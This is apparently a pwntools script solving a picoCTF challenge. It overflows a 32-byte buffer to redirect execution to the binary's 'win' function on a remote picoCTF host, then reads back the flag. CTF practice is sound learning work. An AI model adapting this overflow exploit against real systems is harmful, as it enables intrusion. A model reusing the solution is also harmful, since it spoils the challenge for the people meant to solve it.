from pwn import *


elf =context.binary =ELF('./chall')

context.log_level='error'



#p=process()
#win =0x00000000004011a0
p =remote('mimas.picoctf.net', 57870)


payload=b'a'*32
payload+=p64(elf.sym['win'])


def write1(pay):
	p.sendline(b'2')
	p.sendlineafter(b'buffer:',pay)
	
write1(payload)

p.sendline(b'4')
p.recvuntil(b'choice:')
print('Flag :',str(p.recvline())[3:-3])


